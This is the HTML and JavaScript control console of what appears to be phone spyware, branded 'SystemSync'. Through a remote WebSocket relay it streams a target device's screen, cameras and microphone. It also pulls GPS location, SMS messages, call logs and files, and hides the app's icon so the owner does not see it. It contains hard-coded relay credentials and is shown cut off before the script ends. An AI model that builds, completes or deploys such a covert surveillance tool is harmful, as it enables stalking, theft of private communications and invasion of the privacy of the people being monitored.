<!DOCTYPE html>
<html>
<head>
<title>SystemSync Console</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f2f5;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;overflow:hidden;color:#1e293b}

/* Sidebar */
#sidebar{width:240px;background:#ffffff;border-right:1px solid #e2e8f0;padding:12px 8px;overflow-y:auto;display:flex;flex-direction:column;gap:2px;flex-shrink:0;box-shadow:2px 0 8px rgba(0,0,0,.04)}
.logo{font-size:15px;font-weight:700;color:#2563eb;padding:8px;letter-spacing:.3px;border-bottom:1px solid #e2e8f0;margin-bottom:8px}
.logo span{color:#94a3b8;font-size:10px;font-weight:400;display:block}
.section{font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;padding:8px 8px 2px}
button{width:100%;padding:8px 10px;background:transparent;color:#475569;border:none;border-radius:6px;font-size:13px;text-align:left;cursor:pointer;display:flex;align-items:center;gap:8px;transition:.1s}
button:hover{background:#eff6ff;color:#2563eb}
button .ico{font-size:14px;width:20px;text-align:center}
.camera-panel{background:#f8fafc;border-radius:6px;padding:8px;margin:2px 0 4px;display:none;border:1px solid #e2e8f0}
.camera-panel.show{display:block}
.camera-row{display:flex;gap:10px;margin-bottom:6px;align-items:center;flex-wrap:wrap}
.camera-row label{font-size:12px;color:#64748b;display:flex;align-items:center;gap:4px}
.cam-action{width:100%;padding:6px;background:#2563eb;color:white;border:none;border-radius:5px;cursor:pointer;font-size:12px;margin-top:4px}
.cam-action:hover{background:#1d4ed8}

/* Main panel */
#main{flex:1;display:flex;flex-direction:column;min-width:0;background:#f0f2f5}
#header{height:50px;background:#ffffff;border-bottom:1px solid #e2e8f0;display:flex;align-items:center;justify-content:space-between;padding:0 16px;font-weight:600;color:#1e293b}
#status{padding:4px 12px;border-radius:20px;background:#dbeafe;color:#1d4ed8;font-size:12px}
#status.offline{background:#fee2e2;color:#b91c1c}
#status.online{background:#dcfce7;color:#15803d}
#content{flex:1;padding:16px;overflow:auto}
#main-panel{background:#ffffff;border-radius:12px;border:1px solid #e2e8f0;padding:20px;min-height:100%}

/* Live controls */
.live-controls{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
.live-controls button{flex:1;background:#2563eb;color:white;border:none;padding:8px;border-radius:6px;cursor:pointer;font-size:13px}
.live-controls button.stop{background:#dc2626}
.live-controls button.rec{background:#7c3aed}
.screen-toolbar{display:flex;align-items:center;gap:8px;margin-bottom:10px;padding:8px;background:#f8fafc;border-radius:8px;border:1px solid #e2e8f0;flex-wrap:wrap}
.screen-toolbar select{background:#fff;border:1px solid #e2e8f0;border-radius:4px;padding:4px;font-size:12px}
.screen-toolbar button{width:auto;background:#2563eb;color:white;border:none;padding:4px 10px;border-radius:4px;cursor:pointer}
.screen-toolbar button.stop{background:#dc2626}

/* Map */
#map{height:400px;border-radius:8px;border:1px solid #e2e8f0}
.map-info{position:absolute;top:10px;left:10px;background:rgba(255,255,255,.95);padding:8px 12px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);font-size:12px;border-left:3px solid #2563eb}

/* Tables (SMS & Call Logs) */
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#f8fafc;color:#64748b;font-weight:600;padding:8px 10px;text-align:left;border-bottom:2px solid #e2e8f0}
td{padding:6px 10px;border-bottom:1px solid #f1f5f9;color:#334155}
tr:hover td{background:#f8fafc}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
.badge-in{background:#e6f7e6;color:#0a7b0a}
.badge-out{background:#e6f0ff;color:#2563eb}
.badge-miss{background:#ffe6e6;color:#b91c1c}
.pagination{display:flex;gap:4px;margin-top:12px;justify-content:center}
.page-btn{padding:4px 8px;border:1px solid #e2e8f0;background:white;border-radius:4px;cursor:pointer}
.page-btn.active{background:#2563eb;color:white}

/* File Manager */
.fm-toolbar{display:flex;align-items:center;gap:6px;margin-bottom:10px;flex-wrap:wrap}
.fm-path{flex:1;background:#f8fafc;border:1px solid #e2e8f0;border-radius:4px;padding:4px 8px;font-size:12px}
.fm-tree{background:#fafafa;border:1px solid #e2e8f0;border-radius:6px;padding:8px;max-height:400px;overflow:auto}
.fm-folder,.fm-file{display:flex;align-items:center;gap:6px;padding:4px;border-radius:4px;cursor:pointer}
.fm-folder:hover{background:#e6f0ff}
.fm-file:hover{background:#f8fafc}
.fm-folder span,.fm-file span{flex:1}
.fm-size{color:#94a3b8;font-size:11px;width:60px}
.fm-date{color:#94a3b8;font-size:11px;width:80px}
.fm-children{margin-left:24px;display:none}
.fm-children.open{display:block}

img,video{max-width:100%;max-height:70vh;border-radius:8px}
audio{width:100%;margin-top:10px}
</style>
</head>
<body>

<div id="sidebar">
  <div class="logo">SystemSync<span>Remote Console</span></div>

  <div class="section">Surveillance</div>
  <button id="screenShareBtn"><span class="ico">🖥</span> <span id="screenBtn">Screen Share</span></button>

  <!-- Still Picture -->
  <button onclick="toggleCameraPanel('click')"><span class="ico">📷</span> Still Photo</button>
  <div id="clickCameraPanel" class="camera-panel">
    <div class="camera-row">
      <label><input type="radio" name="clickCam" value="front" checked> Front</label>
      <label><input type="radio" name="clickCam" value="back"> Back</label>
      <label><input type="checkbox" id="clickFlash"> Flash</label>
    </div>
    <button class="cam-action" onclick="capturePicture()">📸 Capture</button>
  </div>

  <!-- Live Camera -->
  <button onclick="toggleCameraPanel('live')"><span class="ico">📹</span> Live Camera</button>
  <div id="liveCameraPanel" class="camera-panel">
    <div class="camera-row">
      <label><input type="radio" name="liveCam" value="front" checked> Front</label>
      <label><input type="radio" name="liveCam" value="back"> Back</label>
      <label><input type="checkbox" id="liveMic" checked> Mic</label>
    </div>
    <button class="cam-action" onclick="startLiveStream()">▶ Start</button>
  </div>

  <!-- Live Audio -->
  <button onclick="toggleLiveAudio()"><span class="ico">🎤</span> Live Audio</button>

  <!-- GPS -->
  <button onclick="sendCommand('GET_LOCATION')"><span class="ico">📍</span> GPS Location</button>

  <div class="section">Data</div>
  <button onclick="openFileManager()"><span class="ico">📂</span> File Manager</button>
  <button onclick="sendCommand('GET_SMS',{box:'inbox'})" id="smsBtn"><span class="ico">💬</span> SMS Logs</button>
  <button onclick="sendCommand('GET_CALL_LOGS')"><span class="ico">📞</span> Call Logs</button>

  <div class="section">Control</div>
  <button onclick="toggleAppIcon()"><span class="ico">👻</span> <span id="iconBtn">Hide Icon</span></button>
  <button onclick="sendCommand('VIBRATE',{duration:1000})"><span class="ico">📳</span> Vibrate 1s</button>
</div>

<div id="main">
  <div id="header">
    <div>Control Panel</div>
    <div style="display:flex;align-items:center;gap:10px">
      <span id="status">CONNECTING</span>
      <button onclick="connectWebSocket()" style="width:auto;padding:4px 12px">⟲ Reconnect</button>
    </div>
  </div>
  <div id="content">
    <div id="main-panel">Ready. Select a command from the sidebar.</div>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
// ==================== CONFIG ====================
const WS_URL = "wss://mirror-view.onrender.com";
const ICE_SERVERS = [
  { urls: "stun:stun.relay.metered.ca:80" },
  { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
  { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
  { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
  { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
];

// ==================== GLOBALS ====================
let ws = null;
let screenPC = null, cameraPC = null, audioPC = null;
let screenActive = false, audioActive = false, iconHidden = false;
let mapInstance = null;
let currentData = [], currentPage = 0, dataType = null;
let pendingCommand = null;
let fileCache = { root: null };
let activeFolder = 'root';
let selectedFiles = new Set();
let mediaRecorder = null, recordedChunks = [];

// ==================== WEBSOCKET ====================
function connectWebSocket() {
  if (ws) ws.close();
  setStatus('CONNECTING');
  ws = new WebSocket(WS_URL);
  ws.onopen = () => {
    ws.send('I_AM_WEB');
    setStatus('ONLINE');
    panel().innerHTML = '✅ Connected.';
  };
  ws.onmessage = (e) => {
    const msg = e.data;
    try { handleJSON(JSON.parse(msg)); } catch (e) { handlePlain(msg); }
  };
  ws.onclose = () => { setStatus('OFFLINE'); panel().innerHTML = '🔌 Disconnected.'; ws = null; };
  ws.onerror = () => setStatus('ERROR');
}
function setStatus(s) {
  const el = document.getElementById('status');
  el.innerText = s;
  el.className = s === 'ONLINE' ? 'online' : (s === 'OFFLINE' || s === 'ERROR' ? 'offline' : '');
}

// ==================== SIGNALING ====================
function sendSignaling(msg) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  ws.send(JSON.stringify({ type: 'SIGNALING', data: msg }));
}
function createPeerConnection(streamType, useMic) {
  const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
  if (streamType === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
  else if (streamType === 'camera') {
    pc.addTransceiver('video', { direction: 'recvonly' });
    if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' });
  } else if (streamType === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
  pc.ontrack = (e) => {
    if (streamType === 'screen') {
      const v = document.getElementById('screenVideo');
      if (v) v.srcObject = e.streams[0];
    } else if (streamType === 'camera') {
      const v = document.getElementById('liveCamVideo');
      if (v) v.srcObject = e.streams[0];
    } else if (streamType === 'audio') {
      const a = document.getElementById('liveAudio');
      if (a) { a.srcObject = e.streams[0]; a.play().catch(()=>{}); }
    }
  };
  pc.onicecandidate = (e) => {
    if (e.candidate) sendSignaling({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType });
  };
  return pc;
}
function handleSignaling(msg) {
  let pc = null;
  if (msg.streamType === 'screen') pc = screenPC;
  else if (msg.streamType === 'camera') pc = cameraPC;
  else if (msg.streamType === 'audio') pc = audioPC;
  if (!pc) return;
  if (msg.type === 'ANSWER') {
    pc.setRemoteDescription({ type: 'answer', sdp: msg.sdp }).catch(e => console.error(e));
  } else if (msg.type === 'ICE_CANDIDATE' && msg.candidate) {
    pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error(e));
  }
}

// ==================== SCREEN SHARE ====================
async function toggleScreen() {
  if (screenActive) {
    sendSignaling({ type: 'STOP_SCREEN', streamType: 'screen' });
    if (screenPC) screenPC.close();
    screenPC = null; screenActive = false;
    document.getElementById('screenBtn').innerText = 'Screen Share';
    panel().innerHTML = 'Ready.';
    return;
  }
  panel().innerHTML = '<p>⏳ Starting screen share...</p>';
  screenPC = createPeerConnection('screen', false);
  try {
    const offer = await screenPC.createOffer();
    await screenPC.setLocalDescription(offer);
    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
    screenActive = true;
    document.getElementById('screenBtn').innerText = 'Stop Screen';
    panel().innerHTML = `
      <div class="screen-toolbar">
        <select id="sqSel" onchange="changeQuality(this.value)">
          <option value="600">360p</option>
          <option value="1500" selected>720p</option>
          <option value="3500">1080p</option>
        </select>
        <button onclick="snapScreen()">📸 Screenshot</button>
        <button onclick="toggleScreenRec()" id="screenRecBtn">⏺ Record</button>
        <button class="stop" onclick="toggleScreen()">⏹ Stop</button>
      </div>
      <video id="screenVideo" autoplay playsinline style="width:100%;background:#000"></video>`;
  } catch (e) { console.error(e); panel().innerHTML = '❌ Failed: ' + e.message; screenPC = null; }
}
function changeQuality(kbps) {
  if (!screenPC) return;
  screenPC.getSenders().forEach(s => {
    if (s.track && s.track.kind === 'video') {
      let params = s.getParameters();
      if (!params.encodings) params.encodings = [{}];
      params.encodings[0].maxBitrate = parseInt(kbps) * 1000;
      s.setParameters(params).catch(console.error);
    }
  });
}
function snapScreen() {
  const v = document.getElementById('screenVideo');
  if (!v || !v.videoWidth) return alert('No video');
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  c.toBlob(b => {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = 'screen_' + Date.now() + '.jpg';
    a.click();
  }, 'image/jpeg', 0.92);
}
function toggleScreenRec() {
  const v = document.getElementById('screenVideo');
  if (!v || !v.srcObject) return;
  const btn = document.getElementById('screenRecBtn');
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
    btn.innerText = '⏺ Record';
  } else {
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(v.srcObject, { mimeType: getBestMime() });
    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'screen_rec_' + Date.now() + '.webm';
      a.click();
    };
    mediaRecorder.start(1000);
    btn.innerText = '⏹ Stop Rec';
  }
}

// ==================== LIVE CAMERA ====================
async function startLiveStream() {
  const cam = document.querySelector('input[name="liveCam"]:checked').value;
  const mic = document.getElementById('liveMic').checked;
  panel().innerHTML = `
    <video id="liveCamVideo" autoplay playsinline style="width:100%;background:#000"></video>
    <div class="live-controls">
      <button onclick="takeSnapshot()">📸 Snapshot</button>
      <button class="rec" onclick="toggleCamRec()" id="camRecBtn">⏺ Record</button>
      <button class="stop" onclick="stopLiveStream()">⏹ Stop</button>
    </div>`;
  cameraPC = createPeerConnection('camera', mic);
  try {
    const offer = await cameraPC.createOffer();
    await cameraPC.setLocalDescription(offer);
    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera: cam, mic });
  } catch (e) { console.error(e); panel().innerHTML = '❌ Failed: ' + e.message; cameraPC = null; }
}
function stopLiveStream() {
  sendSignaling({ type: 'STOP_CAMERA', streamType: 'camera' });
  if (cameraPC) cameraPC.close();
  cameraPC = null;
  stopCamRec();
  panel().innerHTML = 'Ready.';
}
function takeSnapshot() {
  const v = document.getElementById('liveCamVideo');
  if (!v || !v.videoWidth) return alert('Video not ready');
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  c.toBlob(b => {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = 'snap_' + Date.now() + '.jpg';
    a.click();
  }, 'image/jpeg', 0.92);
}
function toggleCamRec() {
  const v = document.getElementById('liveCamVideo');
  if (!v || !v.srcObject) return;
  const btn = document.getElementById('camRecBtn');
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
    btn.innerText = '⏺ Record';
  } else {
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(v.srcObject, { mimeType: getBestMime() });
    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'cam_rec_' + Date.now() + '.webm';
      a.click();
    };
    mediaRecorder.start(1000);
    btn.innerText = '⏹ Stop Rec';
  }
}
function stopCamRec() {
  if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
  mediaRecorder = null;
}
function getBestMime() {
  const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
  return types.find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
}

// ==================== LIVE AUDIO ====================
async function toggleLiveAudio() {
  if (audioActive) {
    sendSignaling({ type: 'STOP_AUDIO', streamType: 'audio' });
    if (audioPC) audioPC.close();
    audioPC = null; audioActive = false;
    panel().innerHTML = 'Ready.';
    return;
  }
  panel().innerHTML = `
    <div style="text-align:center">
      <div style="font-size:40px">🎙</div>
      <audio id="liveAudio" autoplay controls></audio>
      <button onclick="stopLiveAudio()" style="margin-top:10px;background:#dc2626;color:white;border:none;padding:8px 16px;border-radius:6px">Stop</button>
    </div>`;
  audioPC = createPeerConnection('audio', false);
  try {
    const offer = await audioPC.createOffer();
    await audioPC.setLocalDescription(offer);
    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
    audioActive = true;
  } catch (e) { console.error(e); panel().innerHTML = '❌ Failed'; audioPC = null; }
}
function stopLiveAudio() {
  sendSignaling({ type: 'STOP_AUDIO', streamType: 'audio' });
  if (audioPC) audioPC.close();
  audioPC = null; audioActive = false;
  panel().innerHTML = 'Ready.';
}

// ==================== COMMANDS ====================
function sendCommand(cmd, params) {
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    panel().innerHTML = '<div style="color:#f87171">⚠ Not connected.</div>'; return;
  }
  const rid = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
  ws.send(JSON.stringify({ type: 'COMMAND', command: cmd, requestId: rid, params: params || {}, timestamp: Date.now() }));
  panel().innerHTML = '📤 Sent: ' + cmd;
  pendingCommand = cmd;
  setTimeout(() => { if (pendingCommand === cmd) pendingCommand = null; }, 15000);
}
function sendPlain(msg) {
  if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

// ==================== MESSAGE HANDLERS ====================
function handleJSON(json) {
  if (json.type === 'SIGNALING') { handleSignaling(json.data); return; }
  switch (json.type) {
    case 'SMS_DATA':
      dataType = 'sms';
      currentData = parseData(json.data);
      currentPage = 0;
      renderTable();
      pendingCommand = null;
      break;
    case 'CALL_LOGS':
      dataType = 'call';
      currentData = parseData(json.data);
      currentPage = 0;
      renderTable();
      pendingCommand = null;
      break;
    case 'FILE_LIST':
      handleFileList(parseData(json.data));
      pendingCommand = null;
      break;
    case 'LOCATION_UPDATE':
      renderMap(json.data);
      pendingCommand = null;
      break;
    case 'CAMERA_IMAGE':
      displayImage(json.data);
      pendingCommand = null;
      break;
    case 'AUDIO_RECORDING':
      showAudio(json.data);
      pendingCommand = null;
      break;
    case 'ERROR':
      panel().innerHTML = '<div style="color:#f87171">❌ ' + json.error + '</div>';
      pendingCommand = null;
      break;
    case 'DEVICE_STATUS':
      setStatus(json.status);
      break;
    case 'APP_HIDDEN':
      iconHidden = true;
      document.getElementById('iconBtn').innerText = 'Show Icon';
      break;
    case 'APP_SHOWN':
      iconHidden = false;
      document.getElementById('iconBtn').innerText = 'Hide Icon';
      break;
    default:
      // Try to infer response
      if (pendingCommand === 'GET_LOCATION' && json.lat != null) {
        renderMap(json);
      } else if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
        handleFileList(json);
      } else if ((pendingCommand === 'GET_SMS' || pendingCommand === 'GET_CALL_LOGS') && Array.isArray(json)) {
        if (pendingCommand === 'GET_SMS') { dataType = 'sms'; currentData = json; }
        else { dataType = 'call'; currentData = json; }
        currentPage = 0;
        renderTable();
      }
      pendingCommand = null;
      break;
  }
}
function parseData(d) {
  if (Array.isArray(d)) return d;
  if (typeof d === 'string') { try { return JSON.parse(d); } catch (e) { return []; } }
  return [];
}
function handlePlain(msg) {
  if (msg.startsWith('STATUS:')) setStatus(msg.substring(7));
  else if (msg.startsWith('LOC_DATA:')) { try { renderMap(JSON.parse(msg.substring(9))); } catch(e) {} }
  else if (msg.startsWith('FILE_LIST:')) { try { handleFileList(JSON.parse(msg.substring(10))); } catch(e) {} }
  else if (msg.startsWith('SMS_DATA:')) { try { currentData = JSON.parse(msg.substring(9)); dataType='sms'; renderTable(); } catch(e) {} }
  else if (msg.startsWith('CALL_DATA:')) { try { currentData = JSON.parse(msg.substring(10)); dataType='call'; renderTable(); } catch(e) {} }
  else if (msg.startsWith('CAMERA_IMAGE:')) displayImage(msg.substring(13));
  else if (msg.startsWith('AUDIO_RECORDING:')) showAudio(msg.substring(16));
  else if (msg.startsWith('APP_HIDDEN')) { iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; }
  else if (msg.startsWith('APP_SHOWN')) { iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; }
  else if (msg.startsWith('FILE_DATA:')) downloadBase64(msg.substring(10), 'file.bin');
  else if (msg.startsWith('ERROR:')) panel().innerHTML = '<div style="color:#f87171">❌ ' + msg.substring(6) + '</div>';
}

// ==================== UI HELPERS ====================
function panel() { return document.getElementById('main-panel'); }
function toggleCameraPanel(id) {
  document.getElementById('clickCameraPanel').classList.toggle('show', id === 'click');

}

// ==================== GPS MAP ====================
function renderMap(loc) {
  if (!loc || loc.lat == null) {
    panel().innerHTML = '<div style="color:#f87171">⚠ No location data.</div>'; return;
  }
  panel().innerHTML = '<div style="position:relative"><div id="map"></div></div>';
  const info = document.createElement('div');
  info.className = 'map-info';
  info.innerHTML = `<div>📍 ${loc.lat.toFixed(6)}, ${(loc.lon || loc.lng).toFixed(6)}</div>
    <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
    <div>📡 Provider: ${loc.provider || 'unknown'}</div>`;
  document.querySelector('#main-panel div').appendChild(info);
  if (mapInstance) mapInstance.remove();
  mapInstance = L.map('map').setView([loc.lat, loc.lon], 17);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
  L.marker([loc.lat, loc.lon]).addTo(mapInstance);
  if (loc.accuracy) L.circle([loc.lat, loc.lon], { radius: loc.accuracy, color: '#2563eb' }).addTo(mapInstance);
  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}`)
    .then(r => r.json()).then(d => info.innerHTML += `<div>🌍 ${d.display_name || 'Unknown'}</div>`)
    .catch(() => info.innerHTML += '<div>🌍 Address unavailable</div>');
}

// ==================== TABLES (SMS & CALL) ====================
function renderTable() {
  if (!currentData || !currentData.length) {
    panel().innerHTML = '<div style="padding:40px;text-align:center;color:#94a3b8">📭 No data.</div>'; return;
  }
  const isSMS = dataType === 'sms';
  const headers = isSMS
    ? '<th>Type</th><th>Number</th><th>Message</th><th>Date</th>'
    : '<th>Type</th><th>Number</th><th>Name</th><th>Date</th><th>Duration</th>';
  const rows = currentData.slice(currentPage * 20, (currentPage + 1) * 20).map(item => {
    if (isSMS) {
      const type = String(item.type || '').toLowerCase();
      const isIn = type.includes('in') || parseInt(item.type) === 1;
      const badgeClass = isIn ? 'badge-in' : 'badge-out';
      const badgeText = isIn ? 'Inbox' : 'Sent';
      return `<tr>
        <td><span class="badge ${badgeClass}">${badgeText}</span></td>
        <td>${escapeHtml(item.number || item.address || '-')}</td>
        <td>${escapeHtml(item.body || '—')}</td>
        <td>${escapeHtml(item.date || '-')}</td>
      </tr>`;
    } else {
      const t = String(item.type || '').toLowerCase();
      const isMiss = t.includes('miss') || t === '3';
      const isOut = t.includes('out') || t === '2';
      const badgeClass = isMiss ? 'badge-miss' : (isOut ? 'badge-out' : 'badge-in');
      const badgeText = isMiss ? 'Missed' : (isOut ? 'Outgoing' : 'Incoming');
      const dur = parseInt(item.duration) || 0;
      return `<tr>
        <td><span class="badge ${badgeClass}">${badgeText}</span></td>
        <td>${escapeHtml(item.number || item.phoneNumber || '-')}</td>
        <td>${escapeHtml(item.name || item.cachedName || '—')}</td>
        <td>${escapeHtml(item.date || '-')}</td>
        <td>${fmtDuration(dur)}</td>
      </tr>`;
    }
  }).join('');
  const totalPages = Math.ceil(currentData.length / 20);
  let pagination = '';
  if (totalPages > 1) {
    pagination = '<div class="pagination">';
    for (let i = 0; i < totalPages; i++) {
      pagination += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="gotoPage(${i})">${i+1}</button>`;
    }
    pagination += '</div>';
  }
  panel().innerHTML = `
    <table><thead><tr>${headers}</tr></thead>
    <tbody>${rows}</tbody></table>
    ${pagination}`;
}
function gotoPage(p) { currentPage = p; renderTable(); }
function fmtDuration(s) {
  s = parseInt(s) || 0;
  if (s < 60) return s + 's';
  const m = Math.floor(s / 60), sec = s % 60;
  return m + 'm' + (sec ? ' ' + sec + 's' : '');
}
function escapeHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// ==================== FILE MANAGER ====================
function openFileManager() {
  activeFolder = 'root';
  selectedFiles.clear();
  panel().innerHTML = `
    <div class="fm-toolbar">
      <button onclick="navUp()">⬆ Up</button>
      <button onclick="refreshFolder()">↺ Refresh</button>
      <button onclick="selectAll()">☑ All</button>
      <button onclick="selectNone()">☐ None</button>
      <div class="fm-path" id="fmPath">/storage/emulated/0</div>
      <button onclick="downloadSelected()" id="dlBtn" disabled>💾 Download (0)</button>
    </div>
    <div class="fm-tree" id="fmTree"></div>`;
  sendCommand('LIST_FILES', { path: 'root' });
}
function handleFileList(items) {
  fileCache[activeFolder] = items;
  renderFileTree(activeFolder, items);
}
function renderFileTree(path, items) {
  const container = document.getElementById('fmTree');
  if (!container) return;
  const folders = items.filter(i => i.isDir).sort((a,b) => a.name.localeCompare(b.name));
  const files = items.filter(i => !i.isDir).sort((a,b) => a.name.localeCompare(b.name));
  let html = '';
  folders.forEach(f => {
    const id = encodeURIComponent(f.path);
    html += `<div class="fm-folder" onclick="toggleFolder('${id}','${escapeJs(f.path)}')" data-path="${escapeJs(f.path)}">
      <span>📁 ${escapeHtml(f.name)}</span>
      <span class="fm-size">${f.childCount || '—'}</span>
      <span class="fm-date">${(f.lastModified || '').substring(0,10)}</span>
    </div>
    <div id="child-${id}" class="fm-children"></div>`;
  });
  files.forEach(f => {
    const path = f.path;
    html += `<div class="fm-file" onclick="toggleFileSelect(this, '${escapeJs(path)}')">
      <input type="checkbox" onchange="fileCheckChanged(this, '${escapeJs(path)}')" style="margin-right:6px">
      <span>${fileIcon(f.name)} ${escapeHtml(f.name)}</span>
      <span class="fm-size">${formatBytes(f.size)}</span>
      <span class="fm-date">${(f.lastModified || '').substring(0,10)}</span>
    </div>`;
  });
  container.innerHTML = html;
  updateDlButton();
}
function toggleFolder(id, path) {
  const childDiv = document.getElementById('child-' + id);
  if (childDiv) {
    if (childDiv.innerHTML) {
      childDiv.classList.toggle('open');
    } else {
      childDiv.innerHTML = '<div style="padding:8px;color:#94a3b8">⏳ Loading...</div>';
      activeFolder = path;
      sendCommand('LIST_FILES', { path });
    }
  }
}
function toggleFileSelect(row, path) {
  const cb = row.querySelector('input');
  cb.checked = !cb.checked;
  if (cb.checked) selectedFiles.add(path);
  else selectedFiles.delete(path);
  updateDlButton();
}
function fileCheckChanged(cb, path) {
  if (cb.checked) selectedFiles.add(path);
  else selectedFiles.delete(path);
  updateDlButton();
}
function selectAll() {
  document.querySelectorAll('.fm-file input').forEach(cb => {
    cb.checked = true;
    selectedFiles.add(cb.closest('.fm-file').dataset.path);
  });
  updateDlButton();
}
function selectNone() {
  document.querySelectorAll('.fm-file input').forEach(cb => {
    cb.checked = false;
  });
  selectedFiles.clear();
  updateDlButton();
}
function updateDlButton() {
  const btn = document.getElementById('dlBtn');
  if (btn) {
    const count = selectedFiles.size;
    btn.innerText = `💾 Download (${count})`;
    btn.disabled = count === 0;
  }
}
function downloadSelected() {
  if (selectedFiles.size === 0) return;
  selectedFiles.forEach(p => sendPlain('dl ' + p));
}
function navUp() {
  if (activeFolder === 'root') return;
  const parts = activeFolder.split('/');
  parts.pop();
  const parent = parts.length < 4 ? 'root' : parts.join('/');
  activeFolder = parent;
  if (fileCache[parent]) {
    renderFileTree(parent, fileCache[parent]);
  } else {
    sendCommand('LIST_FILES', { path: parent });
  }
}
function refreshFolder() {
  delete fileCache[activeFolder];
  sendCommand('LIST_FILES', { path: activeFolder });
}
function formatBytes(b) {
  if (!b || b <= 0) return '—';
  const k = 1024, sizes = ['B','KB','MB','GB'];
  const i = Math.floor(Math.log(b) / Math.log(k));
  return (b / Math.pow(k, i)).toFixed(1) + ' ' + sizes[i];
}
function fileIcon(name) {
  const ext = (name || '').split('.').pop().toLowerCase();
  if (['jpg','jpeg','png','gif'].includes(ext)) return '🖼';
  if (['mp4','mkv','avi','mov'].includes(ext)) return '🎬';
  if (['mp3','wav','m4a'].includes(ext)) return '🎵';
  if (ext === 'pdf') return '📕';
  if (ext === 'apk') return '📦';
  if (['txt','log','md'].includes(ext)) return '📝';
  return '📄';
}
function escapeJs(s) {
  return s.replace(/'/g, "\\'").replace(/"/g, '&quot;');
}
